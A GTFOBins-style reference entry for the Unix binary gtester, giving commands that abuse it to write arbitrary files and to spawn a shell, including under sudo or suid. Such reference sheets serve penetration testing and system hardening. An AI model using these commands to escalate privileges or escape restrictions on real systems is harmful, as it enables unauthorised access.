---
type: gtfobin
name: gtester
platform: Unix
functions: [file-write, shell]
tags: [gtfobin, unix, lotl]
---

# gtester

## file-write

```bash
gtester DATA -o /path/to/output-file
```
_Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`)._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
echo 'exec /bin/sh 0<&1' >/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file
```
**Contexts:** sudo, suid, unprivileged
